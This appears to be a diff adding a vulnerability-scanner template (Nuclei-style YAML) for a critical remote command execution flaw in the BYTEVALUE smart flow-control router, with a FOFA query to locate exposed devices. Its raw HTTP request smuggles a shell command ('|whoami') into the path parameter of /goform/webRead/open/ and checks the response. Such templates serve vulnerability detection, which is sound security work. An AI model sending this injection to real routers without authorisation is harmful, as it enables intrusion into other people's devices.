@@ -1,0 +1,23 @@
+id: BYTEVALUE-WebReadOpen-Rce
+info:
+  name: 百为智能流控路由器-WebReadOpen-远程命令执行
+  author: candada
+  severity: critical
+  tags: BYTEVALUE
+    - fofa title="BYTEVALUE 智能流控路由器"
+ 
+http:
+  - raw:
+    - |
+        GET /goform/webRead/open/?path=|whoami HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+ 
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "admin"
+      - type: status
+        status:
+          - 200
